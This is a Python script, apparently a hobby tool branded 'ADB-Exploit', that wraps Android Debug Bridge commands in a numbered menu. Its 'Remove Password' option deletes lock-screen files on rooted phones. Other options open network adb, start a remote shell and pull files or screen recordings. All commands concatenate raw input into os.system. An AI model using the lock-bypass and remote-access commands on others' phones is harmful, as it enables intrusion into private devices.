import os
import time as t



CurrentDir = os.path.dirname(os.path.abspath(__file__))

logo = ('''
  /$$$$$$  /$$$$$$$  /$$$$$$$        /$$$$$$$$                     /$$           /$$   /$$    
 /$$__  $$| $$__  $$| $$__  $$      | $$_____/                    | $$          |__/  | $$    
| $$  \ $$| $$  \ $$| $$  \ $$      | $$       /$$   /$$  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$  
| $$$$$$$$| $$  | $$| $$$$$$$       | $$$$$   |  $$ /$$/ /$$__  $$| $$ /$$__  $$| $$|_  $$_/  
| $$__  $$| $$  | $$| $$__  $$      | $$__/    \  $$$$/ | $$  \ $$| $$| $$  \ $$| $$  | $$    
| $$  | $$| $$  | $$| $$  \ $$      | $$        >$$  $$ | $$  | $$| $$| $$  | $$| $$  | $$ /$$
| $$  | $$| $$$$$$$/| $$$$$$$/      | $$$$$$$$ /$$/\  $$| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/
|__/  |__/|_______/ |_______/       |________/|__/  \__/| $$____/ |__/ \______/ |__/   \___/  
                                                        | $$                                  
                                                        | $$                                  
                                                        |__/                                  
''')


page = '''
 [ 1 ]  Show Connected Devices        [ 7 ]  Screen Shot a picture on a phone       [ 13 ]  List all apps on a phone              
 [ 2 ]  Disconect all devices         [ 8 ]  Restart Server                         [ 14 ]  Run an app                      
 [ 3 ]  Connect a new phone           [ 9 ]  Pull folders from phone to pc          [ 15 ]  Extract apk from app                               
 [ 4 ]  Access Shell on a phone       [ 10 ]  Reboot Device                         [ 16 ]  Get Battery Status           
 [ 5 ]  Install an apk on a phone     [ 11 ]  Uninstall an app                      [ 17 ]  Turn WiFi On/Off                        
 [ 6 ]  Screen record a phone         [ 12 ]  Show real time log of device          [ 18 ]  Remove Password


 [ E ]  Exit    [ 0 ]  Clear                              
'''
#######################################################
def main():
    option = input( "ADB-Exploit (Menu) > ")
    if option == '1':
        os.system("adb devices -l")

    elif option == '2':
        os.system("adb disconnect")

    elif option == '3':
        os.system("adb tcpip 5555")
        ip = input("Enter a phones ip address : ")
        os.system("adb connect "+ip+":5555")
    
    elif option == '4':
        device_name = input("Enter a device name : ")
        os.system("adb -s "+device_name+" shell")

    elif option == '5':
        device_name = input("Enter a device name : ")
        apk_location = input("Enter the apk location : ")
        os.system("adb -s  "+device_name+" install "+apk_location)
        print ("Apk has been installed.")

    elif option == '6':
        device_name = input("Enter a device name : ")
        print ("Please wait its recording") 
        os.system("adb -s "+device_name+" shell screenrecord /sdcard/demo.mp4")
        place_location = input("Enter where you would like the video to be saved : ")
        os.system("adb -s "+device_name+" pull /sdcard/demo.mp4 "+place_location)

    elif option == '7':
        device_name = input("Enter a device name : ")
        os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
        place_location = input("Enter where you would like the screenshot to be saved : ")
        os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)

    elif option == '8':
        os.system("adb kill-server && adb start-server")
    
    elif option == '9':
        device_name = input("Enter a device name : ")
        file_location = input("Enter a file location on a device : ")
        place_location = input("Enter where you would like the file to be saved : ")
        os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)

    elif option == '10':
        device_name = input("Enter a device name : ")
        os.system("adb -s "+device_name+ " reboot ")
    
    elif option == '11':
        device_name = input("Enter a device name : ")
        package_name = input("Enter a package name : ")
        os.system("adb -s "+device_name+" unistall "+package_name)

    elif option == '12':
        device_name = input("Enter a device name : ")
        os.system('adb -s '+device_name+" logcat ")

    elif option == '13':
        device_name = input("Enter a device name : ")
        os.system("adb -s " +device_name+ " shell pm list packages -f")
        main()

    elif option == '14':
        device_name = input("Enter a device name : ")
        package_name = input("Enter a package name : ")
        os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
        main()

    elif option == '15':
        device_name = input("Enter a device name : ")
        package_name = input("Enter a package name : ")
        os.system("adb -s "+device_name+" shell pm path "+package_name)
        path = input("Enter The path : ")
        location = input("Enter The location to store the apk : ")
        os.system("adb -s " +device_name+" pull "+path+" "+location)
        main()

    elif option == '16':
        device_name = input("Enter a device name : ")
        os.system("adb -s " +device_name+ " shell dumpsys battery")
        main()

    elif option == '17':
        device_name = input("Enter a device name : ")
        print ("To turn wifi back on you need the device to be pluged in.")
        on_off = input( "Would you like the wifi on/off " )
        if on_off == 'off':
            command = " shell svc wifi disable"
        else:
            command = " shell svc wifi enable"
            os.system("adb -s "+device_name+command)

    elif option == '18':
        device_name = input("Enter a device name : ")
        print ( "THE DEVICE NEEDS TO BE ROOTED TO CONTINUE")
        print ( "******************TRYING TO REMOVE PASS******************")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'") 
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'") 
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
        print ( "******************TRYING TO REMOVE PASS******************")  
        
    elif option == '0':
        clear(page)  

    elif option == 'E':
        exit()

    elif option == 'e':
        exit()
    main()

def clear(page):
    os.system('cls')
    banner_title = logo
    print (banner_title)    
    print (page)

try:
    os.chdir(CurrentDir+"//adb")
    print ("Starting  adb server..")
    os.system("adb tcpip 5555")
    t.sleep(1)
    os.system('cls')
    banner_title = logo
    print (banner_title)  
    print (page)
    main()
except KeyboardInterrupt:
    main()
